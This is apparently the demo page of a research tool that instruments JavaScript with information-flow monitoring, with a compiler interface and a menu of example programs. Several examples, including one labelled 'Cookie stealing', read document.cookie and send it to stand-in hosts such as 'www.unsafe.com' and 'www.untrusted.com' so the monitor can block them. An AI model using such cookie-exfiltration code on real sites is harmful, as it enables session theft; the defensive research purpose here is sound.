<html>
<?php
setcookie("examplecookie","secret")	;
?>

   <head>
		<title>Instrumenting JavaScript with Information Flow Monitoring</title>

		<link rel="stylesheet" href="srcs/styles/libs/qunit-git.css" />
      <style type="text/css">
      	h1 {
      		font-family: verdana;
      		margin-left: 2%; 
      		margin-top: 2%; 
      	}
      	
      	h2 {
      		font-family: verdana;
      	}
      	
      	textarea {
      		margin-bottom: 3px;
      	}
      	
      	#span_red { 
      		font-family: verdana;
      		font-size: 150%;  
      		color: red; 
      	}
      	
      	#span_buttons {
      		flush: left;
      	}
      	
      	#prog_input, #prog_output {
      		width: 300px;
				height: 300px;
 				font: normal 14px verdana;
 				padding: 2px 10px;
 				border: solid 1px #ddd;
	      	}
      	
      	#main {
      		width: 60%; 
      		margin-left: 10%; 
      		float: left; 
      	}
      	
      	#examples{
      		margin-top: 3%;
      		margin-left: -15%;
      		float: left; 
      	}
      	
      	#examples_code {
      		display: none; 
      	}
      	
      	#examples ul {
      		list-style-type: none; 
      	}
      	
      	#examples li {
      		border: black; 
      		width: 200px;
      		padding: 2px;
      		display: block;
      		margin: 5px; 
      		font: normal 20px verdana;
      		background-color: #ddd;
      	}
      	
      	#examples li:hover {
      		background-color: #777777;
      	}
      	
      	div {
      		float: left; 
      	}
      </style>
      
      
      <script>
         var _runtime = {};  
      </script>

		<script src="srcs/js/libs/jquery-1.9.0.min.js"></script>
		<script src="srcs/js/libs/jquery.validate.min.js"></script>
		<script src="srcs/js/libs/esprima.js"></script>
		<script src="srcs/js/libs/escodegen.js"></script>
		<script src="srcs/js/comp/utils.js"></script>
		<script src="srcs/js/comp/comp.js"></script>
		<script src="srcs/js/comp/comp_identifiers.js"></script>
		<script src="srcs/js/comp/comp_utils.js"></script>
		<script src="srcs/js/comp/normalizer.js"></script>
		<script src="srcs/js/runtimes/comp-runtimes.js"></script>
		<script src="srcs/js/runtimes/lattice.js"></script>
		<script src="srcs/js/runtimes/external-interfaces-management.js"></script>
		<script src="srcs/js/runtimes/external_interfaces.js"></script>
		<!-- <script src="srcs/js/tests/testing-external-libraries.js"></script> -->  
		<!-- <script src="srcs/js/tests/testing-runtime-libraries.js"></script> -->
		<script>
         (function() {
         	var option = {
                  format : {
                     quotes : 'single',
                     indent : {
                        style : '\t'
                     }
                  }
               };
               
            var removeChildren = function(node) {
               while (node.firstChild) {
                  node.removeChild(node.firstChild)
               }
            };
            
            var inputHandler = function() {
               var compiled_st, input_ta, output_prog, st, str;
               input_ta = document.getElementById('prog_input');
               st = window.esprima.parse(input_ta.value);
               
               compiled_st = comp.compile(st);
               // To remove:
               str = JSON.stringify(compiled_st, null, '   ');
               alert(str)

               output_prog = window.escodegen.generate(compiled_st, option);
               $('#prog_output').val(output_prog);
               $('#prog_output').css('background-color', 'white'); 
            };

				var runCompiledProg = function() {
				   var compiled_prog; 
				   _runtime.clearBrowsingData();
				   compiled_prog = $('#prog_output').val();
				   try {
				      eval(compiled_prog); 	
				   } catch (e) {
				      alert(e.toString()); 
				      $('#prog_output').css('background-color', 'red'); 
				   } 
				}
				
			   var processExamples = function() {
			   	var li_examples = $('#examples li'); 
			      $('#examples_code span').each(function(index){
			      	var example_code = $(this).text();
			      	var st = window.esprima.parse(example_code); 
			      	example_code = window.escodegen.generate(st, option);
			      	$(li_examples[index]).click(function(){
			      		$('#prog_input').val(example_code); 
			      	})
			      });	
			   }

				var randomizeGeneration = function () {
					comp.identifiers.randomizeIdentifiers();
					window[comp.identifiers.consts.RUNTIME_IDENT] = _runtime; 
				}
				
				var addExample = function () {
					var example = $('#prog_input').val();
					var new_span = $(document.createElement('span'));
					var new_li = $(document.createElement('li'));
					var total; 
					
					total = $('#examples_code span').length; 
					new_span.text(example); 
					new_li.text('Example '+(total+1));
					
					$('#examples_code').append(new_span);
					$('#examples ul').append(new_li)
					
					processExamples();
				}

				var normalize = function () {
					var input_ta, 
					    normalized_st, 
					    output_prog, 
					    st, 
					    str;
					input_ta = document.getElementById('prog_input');
					st = window.esprima.parse(input_ta.value);
		
					normalized_st = comp.normalize(st);
					// To remove:
					str = JSON.stringify(normalized_st, null, '   ');
					alert(str)
  
					output_prog = window.escodegen.generate(normalized_st, option);
					$('#prog_input').val(output_prog);
				}

            window.onload = function() {
               var b1 = document.getElementById('compile_btn'), 
                   b2 = document.getElementById('run_btn'),
                   b3 = document.getElementById('rand_btn'),
                   b4 = document.getElementById('add_btn'),
		   b5 = document.getElementById('normalize_btn');
               b1.onclick = inputHandler;
               b2.onclick = runCompiledProg;  
               b3.onclick = randomizeGeneration; 
               b4.onclick = addExample; 
               b5.onclick = normalize; 
               processExamples();
            };
         })();
		</script>
	</head>
	<body>
		<h1>Instrumenting JavaScript with Information Flow Monitoring</h1>
		<div id="main">
		    <a href="instrumentation-long.pdf">Full Version of the Paper</a><br /> 
		    <a href="external_interfaces.js">Policies for External Interfaces</a><br /> 
            <a href="ifJS.zip">Source Code</a><br /> 
			<h2>Input:</h2>
			<textarea id="prog_input">//Enter here your JavaScript input program. If the program is not normalized, it must be normalized before being compiled.  All examples in the menu are already normalized. (Normalization is formally defined in the full version of the paper.)

                        </textarea>
			<br />
			<button id="rand_btn">Randomize</button>
			<button id="compile_btn">Compile</button>
			<button id="add_btn">Save</button>
                        <button id="normalize_btn">Normalize</button>
			<br />
			<br />
			<h2>Output:</h2>
			<textarea id="prog_output">//Output Program: if the program triggers an information flow, its execution is blocked and the background becomes red </textarea>
			<br /> 
			<button id="run_btn">Run</button>
			<br />
			<br /> 
		
		</div>
		<div id="examples">
		<h2> Examples:</h2>
			<ul>
			<li id="ex1">Simple explicit flow</li>
			<li id="ex2">Simple implicit flow </li>
			<li id="ex3">Property upgrade</li>
			<li id="ex4">Implicit flow</li>
			<li id="dyn">Dynamic property creation</li>
			<li id="struct">Structure upgrade</li>
			<li id="ex5">Eval</li>
			<li id="ex6">Implicit flow with eval</li>
			<li id="ex7">DOM createTextNode</li>
			<li id="ex8">DOM integrity flow</li>
			<li id="ex9">XMLHTTPRequest flow</li>
			<li id="ex10">XMLHTTPRequest flow</li>
			<li id="ex11">XMLHTTPRequest flow</li>
			<li id="ex12">setTimeout</li>
			<li id="ex13">alert</li>
			<li id="ex14_1">confirm and toString</li>
			<li id="ex14_2">confirm and toString</li>
			<li id="ex14_3">confirm and toString</li>
			<li id="ex15">Tampering with native functions</li>
			<li id="ex15b">Useless tampering with native functions</li>
			<li id="ex16">New object</li>
			<li id="ex17">Implicit flow</li>
			<li id="ex18">Prototype lookup</li>
			<li id="ex21">Function call</li>
			<li id="ex22">Implicit flow</li>
			<li id="aliasing">Aliasing</li>
			<li id="ex23">Cookie stealing</li>
			<li id="ex24">Coercions are handled</li>
			<li id="ex25">For in safe+reject</li>
			<li id="ex26">For in safe+accept</li>
			<li id="ex27">For in standard use, accept</li>
			</ul>
		</div>
		
		<div id="examples_code">
			<span id="ex1_code"> 
				var x, y;
				x = 4;
				upgVar(x, '2');
				y = x + 4; 
			</span>

			<span id="ex2_code"> 
				var x, y;
				y = 3;
				upgVar(y, '2');
				if (y) {
					x = 2;
				} 
			</span>

			<span id="ex3_code"> 
				var x, y, z;
				y = 3;
				upgVar(y, '2');
				z = {};
				z['p'] = null;
				upgProp(z, 'p', '2');
				if (y) {
					z['p'] = 2;
				} 
			</span>

			<span id="ex4_code"> 
				var x, y, z;
				y = 3;
				upgVar(y, '2');
				z = {};
				z['p'] = null;
				if (y) {
					z['p'] = 2;
				} 
			</span>
			<span id="dyn_code"> var o, h;
				o = {};
				h = 3;
				upgVar(h, '2');
				if(h) {
					o['p'] = 2;
				} 
			</span>

			<span id="struct_code"> var o, h;
				o = {};
				h = 3;
				upgVar(h, '2');
				upgStruct(o, '2');
				if(h) {
					o['p'] = 2;
				} 
			</span>

			<span id="ex5_code"> 
				var x;
				eval('x = 3; x') 
			</span>

			<span id="ex6_code"> 
				var x, y;
				x = 0;
				y = 2;
				upgVar(y, '2');
				if (y) {
					eval('x = 3; x');
				} 
			</span>

			<span id="ex7_code"> 
				var text_node, h, l;
				h = 1;
				upgVar(h, '2');
				if(h) {
					text_node = document['createTextNode']('macaco');
				}
				l = text_node; 
			</span>

			<span id="ex8_code"> 
				var low_integrity_string, text_node, div;
				low_integrity_string = 'xpto';
				upgVar(low_integrity_string, '2');
				text_node = document['createTextNode'](low_integrity_string);
				div = document['createElement']('div');
				div['appendChild'](text_node); 
			</span>

			<span id="ex9_code"> 
			var xhr, cookie, url;
			upgProp(document, 'cookie', '2');
			xhr = new XMLHttpRequest();
			cookie = document['cookie'];
			url = 'www.unsafe.com?' + cookie;
			xhr['open']('POST', cookie);
			xhr['send']();
			</span>
         
         <span id="ex10_code"> 
			var xhr, cookie, url;
			xhr = new XMLHttpRequest();
			cookie = document['cookie'];
			url = 'www.unsafe.com?' + cookie;
			xhr['open']('POST', cookie);
			xhr['send']();
			</span>
			
			<span id="ex11_code"> 
			var xhr, cookie, url;
			upgProp(document, 'cookie', '2');
            		upgUrl('www.safe.com', '2');
			xhr = new XMLHttpRequest();
			cookie = document['cookie'];
			url = 'www.safe.com?' + cookie;
			xhr['open']('POST', url);
			xhr['send']();
			</span>

			<span id="ex12_code"> 
				var x, y;
				x = 0;
				y = 1;
				upgVar(y, '2');
				if(y) {
					setTimeout('x = 1', 1000);
				} 
			</span>

			<span id="ex13_code"> 
				var n, o;
				n = 10;
				o = {};
				while(n) {
					o[n] = n;
					n = n - 1;
					alert(n);
				} 
			</span>

		 
        

         <span id="ex14_1_code">
         	var o1, o2, public1, public2, secret, aux_f, var_aux;
            o1 = {};
            o2 = {};
            secret = confirm('Do you have a secret?');
            aux_f = function () {
 	             return 'p';
            };
            o1['toString'] = aux_f;
            o2['p'] = secret;
            public1 = o2[o1];
            if (public1) {
	           public2 = 3;
            }
         </span>
 <span id="ex14_2_code">
         	var o1, o2, public1, public2, secret, aux_f, var_aux;
            o1 = {};
            o2 = {};
            secret = confirm('Do you have a secret?');
            aux_f = function () {
 	             return 'p';
            };
            o1['toString'] = aux_f;
            o2['p'] = secret;
            var_aux = o1['toString']();
            public1 = o2[var_aux];
            if (public1) {
	           public2 = 3;
            }
         </span>
<span id="ex14_3_code">
         	var o1, o2, public1, public2, secret, aux_f, var_aux;
            o1 = {};
            o2 = {};
            secret = confirm('Do you have a secret?');
            aux_f = function () {
 	             return 'p';
            };
            o1['toString'] = aux_f;
            o2['p'] = secret;
            var_aux = o1['toString']();
            public1 = o2[var_aux];
            upgVar(public2, '5');
            if (public1) {
	           public2 = 3;
            }
         </span>
         

			<span id="ex15_code"> 
				var o, f_aux, h;
				o = {}; 
				o['p'] = 0;
				upgStruct(o, '2');
				f_aux = function () {
					return false;
				};
				o['hasOwnProperty'] = f_aux;
				h = 1; 
				upgVar(h, '2'); 
				if (h) {
					o['p'] = 1;
				}
			</span>

			<span id="ex15b_code"> 
				var o, f_aux, h;
				o = {}; 
				upgStruct(o, '2');
				f_aux = function () {
					return false;
				};
				o['hasOwnProperty'] = f_aux;
				h = 1; 
				upgVar(h, '2'); 
				if (h) {
					o['p'] = 1;
				}
			</span>

			<span id="ex16_code"> 
				var Person, p1, low;
				Person = function(id, name, age) {
					var this_aux;
					this_aux = this;
					this_aux['id'] = id;
					this_aux['name'] = name;
					this_aux['age'] = age;
					upgProp(this_aux, 'id', '2');
				}
				p1 = new Person(1, 'Raquel', 22);
				low = p1['id']; 
			</span>

			<span id="ex17_code"> 
				var Person, p1, high, low, high;
				Person = function(id, name, age) {
					var this_aux;
					this_aux = this;
					this_aux['id'] = id;
					this_aux['name'] = name;
					this_aux['age'] = age;
					upgProp(this_aux, 'id', '2');
				}
				p1 = new Person(1, 'Raquel', 22);
				high = p1['id'];
				if(high) {
					low = high + 4;
				} 
			</span>

			<span id="ex18_code"> 
				var Person, p1, aux_var_1,low,high;
				Person = function(id, name, age) {
					var this_aux;
					this_aux = this;
					this_aux['id'] = id;
					this_aux['name'] = name;
					this_aux['age'] = age;
					upgProp(this_aux, 'id', '2');
				}

				aux_var_1 = Person['prototype'];
				aux_var_1['someSecret'] = 'very secret string';
				upgProp(aux_var_1, 'someSecret', '2');

				p1 = new Person(1, 'Raquel', 22);
				high = p1['someSecret'];
				if (high) {
					low = high + ' other secret';
				} 
			</span>


			<span id="ex21_code"> var o, h;
			var Person, person_proto, function_aux, new_person, high; 
            Person = function(name, id) {
              var this_aux; 
              this_aux = this; 
              this_aux['name'] = name; 
              this_aux['id'] = id; 
              upgProp(this_aux, 'id', '2');
            } 
            person_proto = Person['prototype']; 
            function_aux = function() {
              var aux_var_1; 
              aux_var_1 = this; 
              aux_var_1 = aux_var_1['id']; 
              return aux_var_1; 
            }
            person_proto['sayYourId'] = function_aux;
            new_person = new Person('raquel', 1); 
            high = new_person['sayYourId'](); 
			</span>

			<span id="ex22_code"> 
			var o, h, Person, person_proto, function_aux, new_person, high; 
            Person = function(name, id) {
              var this_aux; 
              this_aux = this; 
              this_aux['name'] = name; 
              this_aux['id'] = id; 
              upgProp(this_aux, 'id', '2');
            } 
            person_proto = Person['prototype']; 
            function_aux = function() {
              var aux_var_1; 
              aux_var_1 = this; 
              aux_var_1 = aux_var_1['id']; 
              return aux_var_1; 
            }
            person_proto['sayYourId'] = function_aux;
            new_person = new Person('raquel', 1); 
            high = new_person['sayYourId'](); 
            
            if(high) {
              low = high * 2; 
            }
			</span>
		<span id="aliasing_code"> 
			var x, y, h, z1,z2;
			upgVar(h, '2');
			h = 'this program is usually rejected by static analysis';
			x = {};
			x['f'] = 0;
			y = x;	
			y['f'] = h;
			z1 = y['f'];
			alert(z1);
			z2 = x['f'];
			alert(z2);
		</span>        
   	
			<span id="ex23_code"> 
			var cookie, url;
			forbidPropUpg(window, 'location');
			upgProp(document, 'cookie', '2');
			cookie = document['cookie'];
			url = 'http://www.untrusted.com/' + cookie;
			window['location'] = url;
			</span>
</span>        
   	
			<span id="ex24_code">
			var h, l, o, aux;
			h = 1;  
			l = false; 
			o = {}; 
			aux = function(){
  			var aux; 
  			if(h) {
    			aux = {}; 
    			return aux; 
  			} else {
     			return 1; 
  			}
			}
			o['valueOf'] = aux; 
			aux = function(){
   			l = true; 
   			return 5; 
			}
			o['toString'] = aux; 
			o+1; 

 
			
			</span>
</span>        
   	
			<span id="ex25_code"> 
			var l, p, o; 
			o = {}; 
			o['q']= "foo"; 
			o['p'] = "bar"; 
			l = ""; 
			upgProp(o, 'p', '2'); 
			for(p in o) { 
   				l = l + p; 
				}
			alert(l); 
			</span>
</span>        
   	
			<span id="ex26_code"> 
						var l, p, o; 
			o = {}; 
			o['q']= "foo"; 
			o['p'] = "bar"; 
			l = ""; 
			upgProp(o, 'p', '2'); 
			for(p in o) { 
   				l = l + p; 
				}
			</span>
</span>        
   	
			<span id="ex27_code"> 
			var l, p, o,s; 
			o = {}; 
			o['q']= "foo"; 
			o['p'] = "bar"; 
			l = ""; 
			upgProp(o, 'p', '2'); 
			for(p in o) { 
   				s = o[p];
				alert(s); 
				}
			</span>

	

		</div>
		<!--<div id="qunit"></div>
		<div id="qunit-fixture"></div>
		<script src="srcs/js/libs/qunit-git.js"></script>-->
		
		 
	</body>
</html>
